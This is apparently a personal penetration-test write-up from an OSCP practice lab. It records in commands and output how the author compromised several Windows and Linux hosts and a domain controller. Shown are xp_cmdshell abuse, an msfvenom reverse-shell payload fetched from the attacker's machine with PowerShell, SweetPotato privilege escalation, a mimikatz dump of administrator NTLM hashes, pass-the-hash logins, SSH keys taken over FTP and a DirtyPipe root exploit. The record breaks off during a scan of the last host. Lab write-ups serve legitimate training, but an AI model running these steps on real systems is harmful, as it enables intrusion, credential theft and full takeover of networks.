+backup_set_id   fir
+
+After checking aroung and found noting, I decided to leverage the xp_cmdshell to get a reverse shell to my kali
+
+SQL (OSCP\sql_svc  dbo@master)> enable_xp_cmdshell
+INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+INFO(MS02\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (OSCP\sql_svc  dbo@master)> RECONFIGURE
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'whoami';
+output                        
+---------------------------   
+nt service\mssql$sqlexpress   
+
+NULL               
+
+ERROR(MS02\SQLEXPRESS): Line 1: Could not find stored procedure 'dir'.
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'whoami /priv';
+output                                                                             
+--------------------------------------------------------------------------------   
+NULL                                                                               
+
+PRIVILEGES INFORMATION                                                             
+
+----------------------                                                             
+
+NULL                                                                               
+
+Privilege Name                Description                               State      
+
+============================= ========================================= ========   
+
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
+
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
+
+SeShutdownPrivilege           Shut down the system                      Disabled   
+
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
+
+SeUndockPrivilege             Remove computer from docking station      Disabled   
+
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
+
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
+
+SeCreateGlobalPrivilege       Create global objects                     Enabled    
+
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
+
+SeTimeZonePrivilege           Change the time zone                      Disabled   
+
+NULL                                                                               
+
+The user also have seImpersonation privilege, so I use sweet potoato to get a reverse shell.
+
+I used ligolo to connect to the python3 web server in my kali to get the tools I need
+I also connected to port 4444 in my kali to get the reverse shell (See Ligolo document to see how I did that)
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<ms01IP> lport=1234 -f exe -o met3.exe       (connected to port 4444 of our kali. see ligolo doc.)
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+Saved as: met3.exe
+
+
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'powershell -c "iwr http://<ms01 address>:1235/SweetPotato.exe -Outfile C:\Users\public\SweetPotato.exe"' (Spowned to port 80 of our kali. see ligolo doc.)
+output   
+------   
+NULL     
+
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'powershell -c "iwr http://<ms01 address>:1235/met3.exe -Outfile C:\Users\public\met3.exe"' (Spowned to port 80 of our kali. see ligolo doc.)
+output   
+------   
+NULL     
+
+SQL (OSCP\sql_svc  dbo@master)> EXECUTE xp_cmdshell 'C:\Users\public\SweetPotato.exe -p C:\Users\public\met3.exe'
+SQL (-@master)> 
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 36818
+Microsoft Windows [Version 10.0.19042.1586]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+hostname
+MS02
+
+
+Used mimikatz to extract administrators password
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 433221 (00000000:00069c45)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : OSCP
+Logon Server      : DC01
+Logon Time        : 3/29/2024 10:16:50 AM
+SID               : S-1-5-21-2610934713-1581164095-2706428072-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : OSCP
+         * NTLM     : 59b280ba707d22e3ef0aa587fc29ffe5
+         * SHA1     : f41a495e6d341c7416a42abd14b9aef6f1eb6b17
+         * DPAPI    : 959ad2ea78c63aebf3233679ad90d769
+        tspkg :
+
+Tested with winrm for the domain controller
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ netexec winrm 10.10.133.146 10.10.133.148 -u administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
+WINRM       10.10.133.146   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam)
+WINRM       10.10.133.148   5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.133.146   5985   DC01             [+] oscp.exam\administrator:59b280ba707d22e3ef0aa587fc29ffe5 (Pwn3d!)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.10.133.148   5985   MS02             [+] oscp.exam\administrator:59b280ba707d22e3ef0aa587fc29ffe5 (Pwn3d!)
+Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+                                                                                                                                                                            
+┌──(kali㉿kali)-[~/oscpb]
+└─$ evil-winrm -i 10.10.133.146 -u administrator -H '59b280ba707d22e3ef0aa587fc29ffe5' 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+oscp\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
+DC01
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       11/30/2024  12:09 AM             34 proof.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat proof.txt
+4fa1de4d32bf3934866d743834df7134
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
+
+
+Standalone machines:
+
+.149
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.173.149                    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-01 08:40 CET
+Nmap scan report for kiero.oscp.exam (192.168.173.149)
+Host is up (0.042s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 5c:5f:f1:bb:02:f9:14:7c:8e:38:32:2b:f4:bc:d0:8c (RSA)
+|   256 18:e2:47:e1:c8:40:a1:d0:2c:a5:87:97:bd:01:12:27 (ECDSA)
+|_  256 26:2d:98:d9:47:6d:22:5d:4a:14:7a:24:5c:98:a2:1d (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=12/1%OT=21%CT=1%CU=38422%PV=Y%DS=4%DC=T%G=Y%TM=674C
+OS:12F3%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
+OS:SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M578ST11NW7%O2=M578S
+OS:T11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578ST11NW7%O6=M578ST11)WIN(W1=
+OS:FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=
+OS:M578NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
+OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
+OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(
+OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
+OS:N%T=40%CD=S)
+
+Network Distance: 4 hops
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using proto 1/icmp)
+HOP RTT      ADDRESS
+1   47.35 ms 192.168.45.1
+2   47.41 ms 192.168.45.254
+3   47.43 ms 192.168.251.1
+4   47.70 ms kiero.oscp.exam (192.168.173.149)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.04 seconds
+           
+Nothing interesting from Nmap
+
+I tried udp port and found snmp port open
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ nmap -sV -sC -sU -p 161 192.168.173.149                        
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-01 09:35 CET
+--------------- Timing report ---------------
+  hostgroups: min 1, max 100000
+  rtt-timeouts: init 1000, min 100, max 10000
+  max-scan-delay: TCP 1000, UDP 1000, SCTP 1000
+  parallelism: min 0, max 0
+  max-retries: 10, host-timeout: 0
+  min-rate: 0, max-rate: 0
+---------------------------------------------
+NSE: Using Lua 5.4.
+NSE: Arguments from CLI: 
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 09:35
+Completed NSE a
+
+# I use this command to get some information via snmp work
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ snmpwalk -v2c -c public 192.168.173.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
+MIB search path: /home/kali/.snmp/mibs:/usr/share/snmp/mibs:/usr/share/snmp/mibs/iana:/usr/share/snmp/mibs/ietf
+Cannot find module (IANA-STORAGE-MEDIA-TYPE-MIB): At line 19 in /usr/share/snmp/mibs/ietf/VM-MIB
+Did not find 'IANAStorageMediaType' in module #-1 (/usr/share/snmp/mibs/ietf/VM-MIB)
+Cannot find module (IEEE8021-CFM-MIB): At line 30 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
+Cannot find module (LLDP-MIB): At line 35 in /usr/share/snmp/mibs/ietf/TRILL-OAM-MIB
+Did not find 'dot1agCfmMdIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
+Did not find 'dot1agCfmMaIndex' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
+Did not find 'dot1agCfmMepIdentifier' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
+Did not find 'dot1agCfmMepEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
+Did not find 'dot1agCfmMepDbEntry' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
+Did not find 'Dot1agCfmIngressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
+Did not find 'Dot1agCfmEgressActionFieldValue' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
+Did not find 'Dot1agCfmRemoteMepState' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
+Did not find 'LldpChassisId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
+Did not find 'LldpChassisIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
+Did not find 'LldpPortId' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
+Did not find 'LldpPortIdSubtype' in module #-1 (/usr/share/snmp/mibs/ietf/TRILL-OAM-MIB)
+Bad operator (INTEGER): At line 73 in /usr/share/snmp/mibs/ietf/SNMPv2-PDU
+Cannot find module (IANA-SMF-MIB): At line 28 in /usr/share/snmp/mibs/ietf/SMF-MIB
+Did not find 'IANAsmfOpModeIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
+Did not find 'IANAsmfRssaIdTC' in module #-1 (/usr/share/snmp/mibs/ietf/SMF-MIB)
+Cannot find module (IANAPowerStateSet-MIB): At line 20 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB
+Did not find 'PowerStateSet' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-MIB)
+Cannot find module (IANA-OLSRv2-LINK-METRIC-TYPE-MIB): At line 26 in /usr/share/snmp/mibs/ietf/OLSRv2-MIB
+Did not find 'IANAolsrv2LinkMetricTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/OLSRv2-MIB)
+Cannot find module (IANA-ENERGY-RELATION-MIB): At line 22 in /usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB
+Did not find 'IANAEnergyRelationship' in module #-1 (/usr/share/snmp/mibs/ietf/ENERGY-OBJECT-CONTEXT-MIB)
+Cannot find module (IANA-BFD-TC-STD-MIB): At line 30 in /usr/share/snmp/mibs/ietf/BFD-STD-MIB
+Did not find 'IANAbfdDiagTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
+Did not find 'IANAbfdSessTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
+Did not find 'IANAbfdSessOperModeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
+Did not find 'IANAbfdSessStateTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
+Did not find 'IANAbfdSessAuthenticationTypeTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
+Did not find 'IANAbfdSessAuthenticationKeyTC' in module #-1 (/usr/share/snmp/mibs/ietf/BFD-STD-MIB)
+NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 1
+NET-SNMP-EXTEND-MIB::nsExtendCommand."RESET" = STRING: ./home/john/RESET_PASSWD
+NET-SNMP-EXTEND-MIB::nsExtendArgs."RESET" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendInput."RESET" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendCacheTime."RESET" = INTEGER: 5
+NET-SNMP-EXTEND-MIB::nsExtendExecType."RESET" = INTEGER: exec(1)
+NET-SNMP-EXTEND-MIB::nsExtendRunType."RESET" = INTEGER: run-on-read(1)
+NET-SNMP-EXTEND-MIB::nsExtendStorage."RESET" = INTEGER: permanent(4)
+NET-SNMP-EXTEND-MIB::nsExtendStatus."RESET" = INTEGER: active(1)
+NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."RESET" = STRING: Resetting password of kiero to the default value
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull."RESET" = STRING: Resetting password of kiero to the default value
+NET-SNMP-EXTEND-MIB::nsExtendOutNumLines."RESET" = INTEGER: 1
+NET-SNMP-EXTEND-MIB::nsExtendResult."RESET" = INTEGER: 0
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."RESET".1 = STRING: Resetting password of kiero to the default value
+
+The output shows that there is a command in user John's directory running reset password for user kiero "Resetting password of kiero to the default value"
+I tried kiero/kiero in ssh, but it didn't work, I tried it on the ftp port it worked
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ ftp 192.168.173.149
+Connected to 192.168.173.149.
+220 (vsFTPd 3.0.3)
+Name (192.168.173.149:kali): kiero
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||10100|)
+150 Here comes the directory listing.
+-rwxr-xr-x    1 114      119          2590 Nov 21  2022 id_rsa
+-rw-r--r--    1 114      119           563 Nov 21  2022 id_rsa.pub
+-rwxr-xr-x    1 114      119          2635 Nov 21  2022 id_rsa_2
+226 Directory send OK.
+ftp> get id_rsa
+local: id_rsa remote: id_rsa
+229 Entering Extended Passive Mode (|||10094|)
+150 Opening BINARY mode data connection for id_rsa (2590 bytes).
+100% |****************************************|  2590       43.87 KiB/s    00:00 ETA
+226 Transfer complete.
+2590 bytes received in 00:00 (26.92 KiB/s)
+ftp> get id_rsa_2
+local: id_rsa_2 remote: id_rsa_2
+229 Entering Extended Passive Mode (|||10090|)
+150 Opening BINARY mode data connection for id_rsa_2 (2635 bytes).
+100% |****************************************|  2635        1.54 MiB/s    00:00 ETA
+226 Transfer complete.
+2635 bytes received in 00:00 (68.59 KiB/s)
+ftp> get id_rsa.pub
+local: id_rsa.pub remote: id_rsa.pub
+229 Entering Extended Passive Mode (|||10094|)
+150 Opening BINARY mode data connection for id_rsa.pub (563 bytes).
+100% |****************************************|   563        4.75 MiB/s    00:00 ETA
+226 Transfer complete.
+563 bytes received in 00:00 (14.73 KiB/s)
+ftp> 
+
+Found some ssh keys on the file server and downloded them localy.
+
+I was able to use one of the ssh keys to get access as john
+
+┌──(kali㉿kali)-[~/oscpb]
+└─$ chmod 600 id_rsa      
+                                                                                                                                                    
+┌──(kali㉿kali)-[~/oscpb]
+└─$ ssh -i id_rsa john@192.168.173.149
+Last login: Tue Nov 22 08:31:27 2022 from 192.168.118.3
+john@oscp:~$ whoami
+john
+john@oscp:~$ hostname
+oscp
+john@oscp:~$ ls
+RESET_PASSWD  local.txt
+john@oscp:~$ ls -a
+
+After mannual enumeration, I ran linpeas. Though, nothing much interesting, The last resort was to escalate privilege via kernel exploit. Lipeaas suggested som exploits.
+                                                                                                                                                                            
+╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                          
+[+] [CVE-2021-3490] eBPF ALU32 bounds tracking for bitwise ops                                                                                                              
+
+   Details: https://www.graplsecurity.com/post/kernel-pwning-with-ebpf-a-love-story
+   Exposure: probable
+   Tags: ubuntu=20.04{kernel:5.8.0-(25|26|27|28|29|30|31|32|33|34|35|36|37|38|39|40|41|42|43|44|45|46|47|48|49|50|51|52)-*},ubuntu=21.04{kernel:5.11.0-16-*}
+   Download URL: https://codeload.github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490/zip/main
+   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
+
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+
+   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+   Exposure: less probable
+   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
+   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2022-2586] nft_object UAF
+
+   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+   Exposure: less probable
+   Tags: ubuntu=(20.04){kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+
+[+] [CVE-2022-0847] DirtyPipe
+
+   Details: https://dirtypipe.cm4all.com/
+   Exposure: less probable
+   Tags: ubuntu=(20.04|21.04),debian=11
+   Download URL: https://haxx.in/files/dirtypipez.c
+
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+
+I went for dirty pipe.
+
+Dowloaded it via this link
+https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c
+https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker/blob/main/dpipe.sh
+
+This video guided me through
+https://www.youtube.com/watch?v=af0PGYaqIWA
+
+I transfered the files to the target, executed the exploit 1 aad got root privilege.
+
+john@oscp:~/exploit$ ls
+compile.sh  dpipe.sh  exploit-1.c  exploit-2.c
+john@oscp:~/exploit$ chmod a+x compile.sh 
+john@oscp:~/exploit$ ./compile.sh 
+john@oscp:~/exploit$ ls
+compile.sh  dpipe.sh  exploit-1  exploit-1.c  exploit-2  exploit-2.c
+john@oscp:~/exploit$ ./exploit-1
+Backing up /etc/passwd to /tmp/passwd.bak ...
+Setting root password to "piped"...
+Password: Restoring /etc/passwd from /tmp/passwd.bak...
+Done! Popping shell... (run commands now)
+whoami
+root
+hostame
+/bin/sh: 2: hostame: not found
+hostname
+oscp
+cd /root
+ls
+proof.txt  snap
+cat proof.txt
+59853adf40b19ac43916c575e01625e8
+
+.150 machine
+
+──(kali㉿kali)-[~/oscpb]
+└─$ sudo nmap -sV -sC -A -Pn -sT 192.168.173.150                    
+[sudo] password for kali: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-01 15:33 CET
+Nmap scan report for berlin.oscp.exam (192.168.173.150)
+Host is up (0.047s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 ad:ac:80:0a:5f:87:44:ea:ba:7f:95:ca:1e:90:78:0d (ECDSA)
+|_  256 b3:ae:d1:25:24:c2:ab:4f:f9:40:c5:f0:0b:12:87:bb (ED25519)
+8080/tcp open  http-proxy
+|_http-favicon: Spring Java Framework
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 
+|     Content-Type: application/json;charset=UTF-8
+|     Date: Sun, 01 Dec 2024 14:33:20 GMT
+|     Connection: close
+|     {"timestamp":"2024-12-01T14:33:20.371+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
+|   GetRequest: 
+|     HTTP/1.1 200 
+|     Content-Type: text/plain;charset=UTF-8
+|     Content-Length: 19
+|     Date: Sun, 01 Dec 2024 14:33:20 GMT
+|     Connection: close
+|     {"api-status":"up"}
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET,HEAD,OPTIONS
+|     Content-Length: 0
+|     Date: Sun, 01 Dec 2024 14:33:20 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 505 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 830
+|     Date: Sun, 01 Dec 2024 14:33:20 GMT
+|     <!doctype html><html lang="en"><head><title>HTTP Status 505 
+|     HTTP Version Not Supported</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1
+|   Socks5: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 800
+|     Date: Sun, 01 Dec 2024 14:33:20 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.94SVN%I=7%D=12/1%Time=674C73AF%P=x86_64-pc-linux-gnu%r
+SF:(GetRequest,98,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/plain;cha
+SF:rset=UTF-8\r\nContent-Length:\x2019\r\nDate:\x20Sun,\x2001\x20Dec\x2020
+SF:24\x2014:33:20\x20GMT\r\nConnection:\x20close\r\n\r\n{\"api-status\":\"
+SF:up\"}")%r(HTTPOptions,75,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OP
+SF:TIONS\r\nContent-Length:\x200\r\nDate:\x20Sun,\x2001\x20Dec\x202024\x20
+SF:14:33:20\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,3C6,"HT
+SF:TP/1\.1\x20505\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nConte
+SF:nt-Language:\x20en\r\nContent-Length:\x20830\r\nDate:\x20Sun,\x2001\x20
+SF:Dec\x202024\x2014:33:20\x20GMT\r\n\r\n<!doctype\x20html><html\x20lang=\
+SF:"en\"><head><title>HTTP\x20Status\x20505\x20\xe2\x80\x93\x20HTTP\x20Ver
+SF:sion\x20Not\x20Supported</title><style\x20type=\"text/css\">h1\x20{font
+SF:-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;fo
+SF:nt-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-serif;color:whit
+SF:e;background-color:#525D76;font-size:16px;}\x20h3\x20{font-family:Tahom
+SF:a,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;
+SF:}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:black;backgroun
+SF:d-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-serif;color:whit
+SF:e;background-color:#525D76;}\x20p\x20{font-family:Tahoma,Arial,sans-ser
+SF:if;background:white;color:black;font-size:12px;}\x20a\x20{color:black;}
+SF:\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;background-color
+SF::#525D76;border:none;}</style></head><body><h1")%r(FourOhFourRequest,11
+SF:3,"HTTP/1\.1\x20404\x20\r\nContent-Type:\x20application/json;charset=UT
+SF:F-8\r\nDate:\x20Sun,\x2001\x20Dec\x202024\x2014:33:20\x20GMT\r\nConnect
+SF:ion:\x20close\r\n\r\n{\"timestamp\":\"2024-12-01T14:33:20\.371\+0000\",
+SF:\"status\":404,\"error\":\"Not\x20Found\",\"message\":\"No\x20message\x
+SF:20available\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt%2ebak\"}")%r(S
+SF:ocks5,3BB,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=u
+SF:tf-8\r\nContent-Language:\x20en\r\nContent-Length:\x20800\r\nDate:\x20S
+SF:un,\x2001\x20Dec\x202024\x2014:33:20\x20GMT\r\nConnection:\x20close\r\n
+SF:\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\
+SF:x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/c
+SF:ss\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:white;background-
+SF:color:#525D76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-
+SF:serif;color:white;background-color:#525D76;font-size:16px;}\x20h3\x20{f
+SF:ont-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76
+SF:;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color
+SF::black;background-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-
+SF:serif;color:white;background-color:#525D76;}\x20p\x20{font-family:Tahom
+SF:a,Arial,sans-serif;background:white;color:black;font-size:12px;}\x20a\x
+SF:20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;
+SF:background-color:#525D76;border:none;}</style></head><body");
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.94SVN%E=4%D=12/1%OT=22%CT=1%CU=41415%PV=Y%DS=4%DC=T%G=Y%TM=674C
+OS:73C4%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)O
+OS:PS(O1=M578ST11NW7%O2=M578ST11NW7%O3=M578NNT11NW7%O4=M578ST11NW7%O5=M578S
+OS:T11NW7%O6=M578ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)E
